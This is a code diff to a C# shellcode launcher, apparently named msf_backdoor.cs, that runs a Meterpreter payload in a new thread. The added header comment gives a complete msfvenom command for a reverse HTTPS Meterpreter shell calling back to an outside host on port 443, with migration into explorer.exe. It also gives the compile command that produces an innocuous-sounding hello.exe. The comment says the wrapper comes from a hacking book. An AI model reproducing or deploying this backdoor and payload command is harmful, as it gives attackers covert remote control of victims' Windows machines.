@@ -5,6 +5,19 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 
+/*
+ Meterpreter wrapper inspired by https://github.com/Arno0x/CSharpScripts/blob/master/shellcodeLauncher.cs
+ Example payload command line to paste in byte[] var variable: 
+ root@Kali:~$ msfvenom -a x86 -p windows/meterpreter/reverse_winhttps LHOST=www.stratjumbo.co.au LPORT=443 prependmigrate=true prepenmigrateprocess=explorer.exe -f csharp
+ 
+ Compile this C# wrapper using csc:
+ C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /out:hello.exe .\msf_backdoor.cs
+ 
+ PS: Change line 99 to suit your migration technique if you change the msfvenom command above.
+ 
+ This wrapper was used in How to Hack Like a Legend book.
+ 
+*/
 namespace shellcode
 {
     class Program
@@ -82,7 +95,9 @@ namespace shellcode
             // execute native code
 
             hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+            //If prependmigrate=true in msfvenom, a wait value of 5000 ms should be sufficient for the main process to terminate after migration.
             WaitForSingleObject(hThread, 5000);
+
             return;
         }
 
